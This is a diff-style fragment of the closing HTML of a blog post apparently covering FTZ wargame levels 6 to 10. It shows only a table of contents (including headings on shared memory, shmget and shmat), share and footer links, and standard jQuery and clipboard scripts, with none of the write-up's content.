+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6"><span class="toc-number">1.</span> <span class="toc-text">Level 6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7"><span class="toc-number">2.</span> <span class="toc-text">Level 7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-1"><span class="toc-number">2.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-1"><span class="toc-number">2.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8"><span class="toc-number">3.</span> <span class="toc-text">Level 8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-2"><span class="toc-number">3.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-2"><span class="toc-number">3.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9"><span class="toc-number">4.</span> <span class="toc-text">Level 9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-3"><span class="toc-number">4.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-3"><span class="toc-number">4.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-10"><span class="toc-number">5.</span> <span class="toc-text">Level 10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-4"><span class="toc-number">5.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-4"><span class="toc-number">5.2.</span> <span class="toc-text">Analyze</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EA%B3%B5%EC%9C%A0%EB%A9%94%EB%AA%A8%EB%A6%AC"><span class="toc-number">5.2.1.</span> <span class="toc-text">공유메모리</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shmget"><span class="toc-number">5.2.2.</span> <span class="toc-text">shmget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shmat"><span class="toc-number">5.2.3.</span> <span class="toc-text">shmat</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&text=FTZ : level 6 ~ 10"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&is_video=false&description=FTZ : level 6 ~ 10"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FTZ : level 6 ~ 10&body=Check out this article: https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&title=FTZ : level 6 ~ 10"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&name=FTZ : level 6 ~ 10&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bintab1e.github.io/2024/09/19/ftz/FTZ-level-6-10/&t=FTZ : level 6 ~ 10"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    bintab1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
